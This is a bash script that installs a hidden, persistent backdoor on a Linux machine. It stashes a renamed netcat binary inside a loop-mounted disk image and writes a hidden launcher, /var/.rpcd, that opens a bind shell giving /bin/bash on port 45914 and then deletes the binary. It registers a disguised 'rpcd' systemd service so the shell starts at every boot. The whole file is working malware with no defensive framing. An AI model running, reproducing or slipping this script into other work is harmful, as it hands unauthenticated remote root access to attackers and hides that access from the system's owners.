#!/bin/bash
dd if=/dev/zero of=/tmp/my_backdoor.img bs=2M count=5
losetup /dev/loop1 /tmp/my_backdoor.img
mkfs -t ext2 -b 1024 /dev/loop1
mount -t ext2 /dev/loop1 /mnt
cp $(which nc) /mnt/rpcd
umount /dev/loop1
losetup -d /dev/loop1

cat > /var/.rpcd << EOL
#!/bin/bash
losetup /dev/loop1 /tmp/my_backdoor.img
mount /dev/loop1 /mnt
cp /mnt/rpcd /tmp
chmod 777 /tmp/rpcd
/tmp/rpcd -lk -p 45914 -e /bin/bash &
sleep 1
unlink /tmp/rpcd
umount /dev/loop1
losetup -d /dev/loop1
EOL

cat > /usr/lib/systemd/system/rpcd.service << EOL
[Unit]
After=network.target

[Service]
Type=forking
ExecStart=/bin/bash -c '/var/\.rpcd'

[Install]
WantedBy=multi-user.target
EOL
chmod 777 /var/.rpcd
systemctl daemon-reload
systemctl enable rpcd.service
systemctl start rpcd.service
